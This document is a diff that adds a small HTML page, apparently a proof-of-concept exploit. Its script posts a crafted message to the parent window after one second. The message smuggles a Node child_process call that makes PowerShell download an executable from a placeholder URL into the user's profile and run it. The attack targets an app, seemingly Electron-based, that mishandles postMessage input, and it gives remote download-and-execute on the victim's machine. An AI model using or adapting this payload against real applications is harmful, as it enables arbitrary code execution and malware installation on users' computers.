@@ -1,0 +1,16 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+
+setTimeout(() => {
+    const payload1 = 'test^@#require("child_process").exec("powershell -Command \\"Invoke-WebRequest -Uri %s -OutFile $env:USERPROFILE\\\\test.exe; Start-Process $env:USERPROFILE\\\\test.exe\\"")';
+    parent.postMessage(payload1, '*');
+
+}, 1000);
+
+
+</script>
+
+
+
+
